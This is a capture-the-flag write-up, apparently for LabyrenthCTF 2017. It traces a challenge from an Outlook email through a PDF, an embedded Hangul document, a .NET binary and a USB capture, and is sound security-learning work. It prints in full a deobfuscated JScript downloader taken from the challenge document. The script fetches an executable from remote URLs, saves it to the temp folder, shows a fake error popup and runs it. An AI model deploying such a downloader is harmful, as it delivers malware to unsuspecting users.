Here we have a .msg file, which is a :

```
Secret Beach Party Invite.msg: CDFV2 Microsoft Outlook Message
```

errkkk. So first convert it to .eml with msgconvert.pl:

```bash
$ msgconvert.pl --verbose   Secret\ Beach\ Party\ Invite.msg
```

Then open it with your favorite mail software (was Thunderbird here).

# First part

## The mail

You get, inside the mail, some text :

```
おはようございます
ビーチパーティーの招待を受け入れてください。
hxxp://www.reversing.sg/B3@chP@r7y/
```

and an attachment secret.invite.pdf.7z that we save.

Google think the text is japanease and translate it to: "Good morning. Please accept the beach party invitation.".

## First website

The url displays some javascript animated text. Looking at the source you see a hexdump of what looks like a base64 :

```
00000000  57 65 5F 68 61 64 5F 6a 6f 79 2c 5F 77 65 5F 68  |R3JlYXQgc3RhcnQg|
00000010  61 64 5F 66 75 6e 2c 5F 77 65 5F 68 61 64 5F 73  |aW4gZmluZGluZyB0|
00000020  65 61 73 6f 6e 73 5F 69 6e 5F 74 68 65 5F 73 75  |aGlzIGNsdWUuICAN|
00000030  6e 2E 2E 42 75 74 5F 74 68 65 5F 77 69 6e 65 5F  |CldlIGhvcGUgdGhh|
00000040  61 6e 64 5F 74 68 65 5F 73 6f 6e 67 5F 6c 69 6b  |dCB5b3UgbGlrZSBo|
00000050  65 5F 74 68 65 5F 73 65 61 73 6f 6e 73 5F 68 61  |dW50aW5nLiANCkFz|
00000060  76 65 5F 61 6c 6c 5F 67 6f 6e 65 2E 2E 57 65 5F  |IHRoZXJlIGFyZSBz|
00000070  68 61 64 5F 6a 6f 79 2c 5F 77 65 5F 68 61 64 5F  |ZXZlcmFsIHRoaW5n|
00000080  66 75 6e 2c 5F 77 65 5F 68 61 64 5F 73 65 61 73  |cyBmb3IgeW91IHRv|
00000090  6f 6e 73 5F 69 6e 5F 74 68 65 5F 73 75 6e 2E 2E  |IGh1bnQgZm9yLg0K|
000000a0  42 75 74 5F 74 68 65 5F 77 69 6e 65 5F 61 6e 64  |DQpUaGUgaGludCB0|
000000b0  5F 74 68 65 5F 73 6f 6e 67 5F 6c 69 6b 65 5F 74  |byBsb2dpbiBpczog|
000000c0  53 68 69 74 69 73 72 65 61 6c 6c 79 62 72 6f 6b  |DQpvbWd3dGZub2Ji|
000000d0  63 51 3d 3d                                      |cQ==|
```

and also a hex string : `676f6f2e676c2f795632744673`, which decodes to `goo.gl/yV2tFs` which redirects to [first part of the flag](http://www.reversing.sg/B3@chP@r7y/Part1.png).

# Second part

Nice. Now the base64 is `R3JlYXQgc3RhcnQgaW4gZmluZGluZyB0aGlzIGNsdWUuICANCldlIGhvcGUgdGhhdCB5b3UgbGlrZSBodW50aW5nLiANCkFzIHRoZXJlIGFyZSBzZXZlcmFsIHRoaW5ncyBmb3IgeW91IHRvIGh1bnQgZm9yLg0KDQpUaGUgaGludCB0byBsb2dpbiBpczogDQpvbWd3dGZub2JicQ==` , which decodes to :

```
Great start in finding this clue.
We hope that you like hunting.
As there are several things for you to hunt for.

The hint to login is:
omgwtfnobbq
```

Ok ... Enough with this website

## Secret invite

So in the mail we had some attachment. However, trying to extract it asks for a password. We tried "labyrenth" without any luck.

However, we just got some hint, try "omgwtfnobbq" just in case, and voila.

We get a pdf file. The only text in it (which is an image) says :

```
Please open attached CNJYY62W.docm file
```

We didn't see any docm file yet, so likely it is hidden in the pdf. Let's see what pdfextract says:

```bash
$ pdfextract secret.invite.pdf
Extracted 3 PDF streams to 'secret.invite.dump/streams'.
Extracted 1 scripts to 'secret.invite.dump/scripts'.
Extracted 1 attachments to 'secret.invite.dump/attachments'.
Extracted 0 fonts to 'secret.invite.dump/fonts'.
Extracted 1 images to 'secret.invite.dump/images'
```

 * The script is just a call to a `submarine()` func.
 * The image is just the "Please open ..." message seen before.
 * The attachment is a ... `Hangul (Korean) Word Processor File 5.x`

Not bad, let's look at it :)

## Hangul

Just discovered that
[Hangul](https://en.wikipedia.org/wiki/Hangul_(word_processor)) is a
"proprietary word processing application [...] with specialized support for the
Korean".

Well ... evince has some ssupport for hwp, so just open it and see some text that I can't copy :/

Just a quick binwalk / hachoir on the hwp file before I start installing HWP
editor shows there is a GIF picture. Sadly, it's just the small version of
text.

I found hancomoffice-hwpviewer which allowed me to copy the text which translates to :

```
A good day for you

I attached a secret document that might help us stop Kim JongCracks

goodbye
Agent K
```

Ok, so really seems there is something hidden in this hwp file. Looking on the Internet, we can see that some HWP Office version where vulnerable to some exploitation.

Looking at it with oletools, we see :

```bash
$ oledir secret.invite.dump/attachments/attached_secret.invite.hwp
oledir 0.51 - http://decalage.info/python/oletools
OLE directory entries in file secret.invite.dump/attachments/attached_secret.invite.hwp:
----+------+-------+----------------------+-----+-----+-----+--------+------
id  |Status|Type   |Name                  |Left |Right|Child|1st Sect|Size
----+------+-------+----------------------+-----+-----+-----+--------+------
0   |<Used>|Root   |Root Entry            |-    |-    |1    |15      |4224
1   |<Used>|Stream |FileHeader            |3    |4    |-    |29      |256
2   |<Used>|Stream |DocInfo               |12   |6    |-    |1F      |633
3   |<Used>|Storage|BodyText              |2    |5    |14   |0       |0
4   |<Used>|Stream |\x05HwpSummaryInformat|-    |-    |-    |17      |457
    |      |       |ion                   |     |     |     |        |
5   |<Used>|Stream |PrvImage              |-    |7    |-    |3       |1259
6   |<Used>|Stream |PrvText               |-    |8    |-    |0       |162
7   |<Used>|Storage|DocOptions            |-    |-    |11   |0       |0
8   |<Used>|Storage|Scripts               |-    |-    |9    |0       |0
9   |<Used>|Stream |JScriptVersion        |10   |-    |-    |30      |13
10  |<Used>|Stream |DefaultJScript        |-    |-    |-    |2D      |136
11  |<Used>|Stream |_LinkDoc              |-    |-    |-    |31      |524
12  |<Used>|Storage|BinData               |-    |-    |13   |0       |0
13  |<Used>|Stream |BIN0001.OLE           |-    |-    |-    |1E      |59814
14  |<Used>|Stream |Section0              |-    |-    |-    |3A      |510
15  |unused|Empty  |                      |-    |-    |-    |0       |0
```

Playing with olebrowse we can save bin0001.ole and defaultjscript, but can be exploited.

At some point we found http://www.vxsecurity.sg/2016/11/22/technical-teardown-exploit-malware-in-hwp-files/  which pointed us to [Cerbero Profiler](http://cerbero.io/profiler/).
Thanks, it has a Linux version.

We quickly find that the Javascript is empty (function only contains a "TODO").
The ole file seems muuuch better. Let's save it.

## Troll.js

So , in this "bin" file we can see a "troll.js" file which contains lot of javascript. At the end of it, there are some ActiveX Object creation and a powershell command.
After removing the extra 'F' in this line, we see it tries to remove 'http://www.kimcannotcrack.shit69/non.existant?enkP' which, sadly, does not exist :()

So, just run this javascript after having removed call to anything suspicious. Especially, comment everything after aSV8(); (ie last few lines) and replace :

```javascript
var aSV8 = LsIZ(lX0vbnD);
```

with:

```javascript
console.log(LsIZ);
console.log(lX0vbnD);
```

This will give you a new piece of JS code (which is likely eval'ed by `LsIZ`):

```javascript
function getDataFromUrl(url, callback) {
    try {
        var xmlHttp = new ActiveXObject("MSXML2.XMLHTTP");
        xmlHttp.open("GET", url, false);
        xmlHttp.send();
        if (xmlHttp.status == 200) {
            return callback(xmlHttp.ResponseBody, false);
        } else {
            return callback(null, true);
        }
    } catch (error) {
        return callback(null, true);
    }
}

function getData(callback) {
    try {
        getDataFromUrl("http://r.u.kidding.me69/DAB58154yc/", function(result, error) {
            if (!error) {
                return callback(result, false);
            } else {
                getDataFromUrl("http://shall.we.playctfga.me69/ni95716oSOsA/", function(result, error) {
                    if (!error) {
                        return callback(result, false);
                    } else {
                        getDataFromUrl("http://omgwtfbbq.no69/VqCj49674sPnb/", function(result, error) {
                            if (!error) {
                                return callback(result, false);
                            } else {
                                getDataFromUrl("http://nono.thiscannot.be69/Isb50659TZdS/", function(result, error) {
                                    if (!error) {
                                        return callback(result, false);
                                    } else {
                                        getDataFromUrl("http://reversing.sg/pdfHWP/part1.flag.exe", function(result, error) {
                                            if (!error) {
                                                return callback(result, false);
                                            } else {
                                                return callback(null, true);
                                            }
                                        });
                                    }
                                });
                            }
                        });
                    }
                });
            }
        });
    } catch (error) {
        return callback(null, true);
    }
}

function getTempFilePath() {
    try {
        var fs = new ActiveXObject("Scripting.FileSystemObject");
        var tmpFileName = "\\" + Math.random().toString(36).substr(2, 9) + ".exe";
        var tmpFilePath = fs.GetSpecialFolder(2) + tmpFileName;
        return tmpFilePath;
    } catch (error) {
        return false;
    }
}

function saveToTemp(data, callback) {
    try {
        var path = getTempFilePath();
        if (path) {
            var objStream = new ActiveXObject("ADODB.Stream");
            objStream.Open();
            objStream.Type = 1;
            objStream.Write(data);
            objStream.Position = 0;
            objStream.SaveToFile(path, 2);
            objStream.Close();
            return callback(path, false);
        } else {
            return callback(null, true);
        }
    } catch (error) {
        return callback(null, true);
    }
}
getData(function(data, error) {
    WshShell = WScript.CreateObject("WScript.Shell");
    Text = "There was an error opening this document. The file is damaged and could not be repaired (for example, it was sent as an email attachment and was not correctly decoded).";
    Title = "Not Supported File Format";
    Res = WshShell.Popup(Text, 0, Title, 0 + 64);
    if (!error) {
        saveToTemp(data, function(path, error) {
            if (!error) {
                try {
                    var wsh = new ActiveXObject("WScript.Shell");
                    wsh.Run(path);
                } catch (error) {}
            }
        });
    }
});
```

So it just tries top get some urls, the only valid one is http://reversing.sg/pdfHWP/part1.flag.exe , which leads us to the next step.

## Exe file

So, we got some `PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows ` file. RE challenge ? maybe not yet ...

First check if there is anything interesting in this binary :

```bash
$ hachoir-subfile part1.flag.exe out
[+] Start search on 450560 bytes (440.0 KB)

[+] File at 0 size=450560 (440.0 KB): Microsoft Windows Portable Executable: Intel 80386, Windows GUI (don't copy whole file)
[+] File at 21127: FAT32 filesystem
[+] File at 32041 size=39606 (38.7 KB): JPEG picture => out/file-0001.jpg
[+] File at 93266 size=74433 (72.7 KB): JPEG picture => out/file-0002.jpg
[+] File at 269885 size=106087 (103.6 KB): JPEG picture => out/file-0003.jpg
[+] File at 396033 size=17568 (17.2 KB): JPEG picture => out/file-0004.jpg
[+] File at 427024: FAT32 filesystem

[+] End of search -- offset=450560 (440.0 KB)
Total time: 194 ms -- global rate: 2.2 MB/sec
```

Ah, maybe we're lucky (remember, we are likely looking for a picture).
Looking at them, one is invalid, 2 are useless (one saying "At least you tried" :/) and one is only half valid.

As it is a mono binary, we can run `monodis` on it.
A quick look on generated sourcecode shows that some crypto method are used and that, at the end, we have 4 arrays of 88 bytes.
Also, a few strings are defined :

 * 4c61627972656e746843544632303137 (which is "LabyrenthCTF2017")
 * F^>Y!\"t|fQlcM-z>o@E#^ {y\\Q%`pS{YdvcSTd~'Ftf(
 * RE,G pZ_QQt \u007f:S'^BMRXoe xs\"oO|Y#\u007f^\"SXTQ&'!P(
 * LvP\"L!@eo:]YPx-Avg~Sm_\u007fx>Fef|#`]fq@]T&L>Vcb(

which are called "szKeyValue", "szlowkey", "szmidkey" and "szhighkey".

Maybe we could try to use them as xor key for the 4 arrays we found. It didn't help :(
Look again at the source file, we find a `StringToXOR` method which does 2 xor (with 0x25 then 0x58), then xor the result with one of the keys.

*Note*: using ILSpy or snSpy makes much cleaner decompilation ;)

Then, the result is decrypted with the function `Decrypt()` which does Rijndael 256/CBC on a base64 string.

If we xor the 4 bytes array with 0x25 then 0x58, we indeed get 4 base64 strings :

```
0pT4/6YNHPWqQSXJf1q5TFHpFFCq4h32RBQFCvXTKXyewMf/Zw5d9adsoXxPD1lqPTLf/qIclHd3Oyf7/PDCVA==
OxEy4bGOmIYFDnwCn+Z7B3TvukNvR69zrq8a8R4+BXotqXt6A8qykns1EIo6m4ssd8KdY7JuXEWTaXZdJHDeUw==
tCfosPPblrYT8g+jaikZgtxMQ6F8V/RDXob1IqyWgMubc/zXNBqk/e5qAMxKcBmIEstQLque4mXAuZ4sivU2EQ==
YDefqoaex0m0bzSqj9viESQqy6TUCD2XNULyAwHIc2qqSj93ZKszDpQUWkIFEzMTElTXMXcN1hzMD6RI77/xLA==
```

We also see that Key and IV a re both set to the value of the 'key' parameter. That's enough to reverse our four strings.
We could have used python or other, but Rijndael 256 is not that common, so let's have some fun and write our .NET decryption script :

```c
using System;
using System.ComponentModel;
using System.Security.Cryptography;
using System.Text;

namespace Doors
{
	public class Form1
	{
		public static int iNum;
		public static string szKeyValue = "4c61627972656e746843544632303137";
		public static string szmidkey = "F^>Y!\"t|fQlcM-z>o@E#^ {y\\Q%`pS{YdvcSTd~'Ftf(";
		public static string szlowkey = "RE,G pZ_QQt \u007f:S'^BMRXoe xs\"oO|Y#\u007f^\"SXTQ&'!P(";
		public static string szhighkey = "LvP\"L!@eo:]YPx-Avg~Sm_\u007fx>Fef|#`]fq@]T&L>Vcb(";

		public static byte[] MagicMum = new byte[]
        {
            36,57,24,27,12,18,28,24,5,77,16,77,31,7,46,12,23,68,11,20,56,46,44,12,4,75,41,40,62,57,79,37,51,40,49,4,60,10,53,52,30,79,12,12,46,23,68,78,39,54,14,7,57,13,44,40,42,22,52,59,56,7,48,41,56,17,41,37,48,37,30,51,76,21,7,48,57,75,47,52,74,74,82,5,49,60,64,64
        };
		public static byte[] MagicNum = new byte[]
        {
            9,62,27,18,14,45,45,31,17,15,36,41,69,26,86,23,28,20,22,39,26,9,5,48,44,75,59,69,43,82,47,57,37,18,31,76,52,12,4,42,26,48,8,31,30,82,7,37,51,63,12,22,82,24,72,12,60,48,5,54,30,63,16,52,56,14,9,44,49,12,8,24,73,16,37,60,8,39,73,14,20,11,40,79,56,44,64,64
        };
		public static byte[] trollMum = new byte[]
        {
            77,13,41,73,82,75,36,51,53,45,42,12,44,46,37,55,27,76,12,72,41,59,53,13,59,59,62,12,73,21,78,79,47,63,44,59,62,11,37,41,54,37,4,24,10,48,27,82,39,10,72,25,68,28,25,14,18,37,5,45,57,76,17,12,45,41,49,27,82,12,52,30,17,53,25,78,50,4,27,74,82,45,57,62,43,60,64,64
        };
		public static byte[] trollNum = new byte[]
        {
            50,5,56,4,73,31,58,50,16,52,36,59,57,19,10,62,19,86,39,74,63,78,41,11,8,22,51,11,47,75,68,7,15,12,69,28,69,47,73,86,63,37,18,9,12,37,9,75,60,69,12,4,22,19,14,76,56,52,18,75,16,73,14,14,25,69,54,25,36,74,55,8,37,56,42,41,28,37,39,25,55,53,57,24,40,10,64,64
        };

		public static void Main()
		{
            string str = Form1.Decrypt(Form1.StringToXOR(Form1.ByteToStr(Form1.trollMum)), Form1.szKeyValue);
            Console.WriteLine("Do you know  " + str);
            string str2 = Form1.Decrypt(Form1.StringToXOR(Form1.ByteToStr(Form1.MagicNum)), Form1.szKeyValue);
            Console.WriteLine("Do you know  " + str2);
            string str3 = Form1.Decrypt(Form1.StringToXOR(Form1.ByteToStr(Form1.MagicMum)), Form1.szKeyValue);
            Console.WriteLine("Do you know  " + str3);
            string str4 = Form1.Decrypt(Form1.StringToXOR(Form1.ByteToStr(Form1.trollNum)), Form1.szKeyValue);
            Console.WriteLine("Do you know  " + str4);
        }

		public static string ByteToStr(byte[] buf)
		{
			return Encoding.UTF8.GetString(buf);
		}

		public static byte[] stringTobyte(string str)
		{
			return Encoding.UTF8.GetBytes(str.ToCharArray());
		}

		public static string ByteTostring(byte[] bt)
		{
			string text = "";
			for (int i = 0; i < bt.Length; i++)
			{
				text += Encoding.Default.GetString(bt, i, 1);
			}
			return text;
		}

		public static string StringToXOR(string data)
		{
			byte[] array = new byte[data.Length];
			array = Form1.stringTobyte(data);
			for (int i = 0; i < array.Length; i++)
			{
				byte[] expr_24_cp_0 = array;
				int expr_24_cp_1 = i;
				expr_24_cp_0[expr_24_cp_1] ^= 37;
				byte[] expr_32_cp_0 = array;
				int expr_32_cp_1 = i;
				expr_32_cp_0[expr_32_cp_1] ^= 88;
			}
			return Form1.ByteTostring(array);
		}

		public static string xorToString(string data)
		{
			byte[] array = new byte[data.Length];
			array = Form1.stringTobyte(data);
			for (int i = 0; i < array.Length; i++)
			{
				byte[] expr_24_cp_0 = array;
				int expr_24_cp_1 = i;
				expr_24_cp_0[expr_24_cp_1] ^= 21;
			}
			return Form1.ByteTostring(array);
		}

		public static string Decrypt(string textToDecrypt, string key)
		{
			RijndaelManaged expr_05 = new RijndaelManaged();
			expr_05.Mode = CipherMode.CBC;
			expr_05.Padding = PaddingMode.PKCS7;
			expr_05.KeySize = 256;
			expr_05.BlockSize = 256;
			byte[] array = Convert.FromBase64String(textToDecrypt);
			byte[] arg_43_0 = Encoding.UTF8.GetBytes(key);
			byte[] array2 = new byte[32];
			int length = arg_43_0.Length;
			Array.Copy(arg_43_0, array2, length);
			expr_05.Key = array2;
			expr_05.IV = array2;
			byte[] bytes = expr_05.CreateDecryptor().TransformFinalBlock(array, 0, array.Length);
			return Encoding.UTF8.GetString(bytes);
		}

		public static string Encrypt(string textToEncrypt, string key)
		{
			RijndaelManaged expr_05 = new RijndaelManaged();
			expr_05.Mode = CipherMode.CBC;
			expr_05.Padding = PaddingMode.PKCS7;
			expr_05.KeySize = 256;
			expr_05.BlockSize = 256;
			byte[] arg_3C_0 = Encoding.UTF8.GetBytes(key);
			byte[] array = new byte[32];
			int length = arg_3C_0.Length;
			Array.Copy(arg_3C_0, array, length);
			expr_05.Key = array;
			expr_05.IV = array;
			ICryptoTransform arg_6B_0 = expr_05.CreateEncryptor();
			byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
			return Convert.ToBase64String(arg_6B_0.TransformFinalBlock(bytes, 0, bytes.Length));
		}

	}
}
```

And here they are :
```bash
$ mcs decrypt.mono 
$ wine decrypt.exe
Do you know  There are images within the usb.pcap!
Do you know  The key to decrypt the flag is XOR 0x21
Do you know  You got to try harder than this!
Do you know  That Labyrenth CTF is pretty decent.
```

*What*.*The*.*Hell* !

## USB PCAP

Running `strings` on the file shows loooot of `USBS` and `USBC` words. What ?
This looks like some usb dump. However, neither binwalk nor hachoir find it.

So, after some googling (yes, again), we find that this USB pcap file should starts with 0xd4c3b2a1. Luckily, there is such sequence at position 0x3094 of our exe file. So :

```bash
$ xxd -s 0x3094 part1.flag.exe   |xxd -r -s -0x3094 > usb.pcap
```

First xxd dumps starting at 0x03094. Second reverse and adds a negative offset of 0x3094 (to start at 0x0).

At the end we get a `tcpdump capture file (little-endian) - version 2.4, capture length 65535)`. Perfect.

After a quick look at it with wireshark, we see some keys pressed and a lot of "big" transfers. Some are looking like pictures. Let's extract them all :

```bash
$ i=0; tshark -T fields -e usb.capdata  -r usb.pcap | tr -d ':' | grep '.\{500\}' | while read line; do echo $line | xxd -r -ps > ${i}.raw; i=$((i+1));done
```

You'll get warning as the usb.pcap file is corrupted. That is expected as we dumped the whole exe file starting at begin of pcap.

Still, it produced 43 raw files. out of them, 3 files are identified as pictures (5, 29 and 37). These are the pictures we already found.

The other files are likely encrypted. Remember what we've been told before :

```
Do you know  The key to decrypt the flag is XOR 0x21
```

Let's give it a try :

```bash
$ for i in $(seq 0 42);do xortool-xor -h 21 -f ${i}.raw > ${i}.raw.xored ;done 
$ file *raw.xored |grep PNG
22.raw.xored: PNG image data, 567 x 800, 8-bit/color RGBA, non-interlaced
```

w00t, and indeed, here is the 2nd part of the flag :)

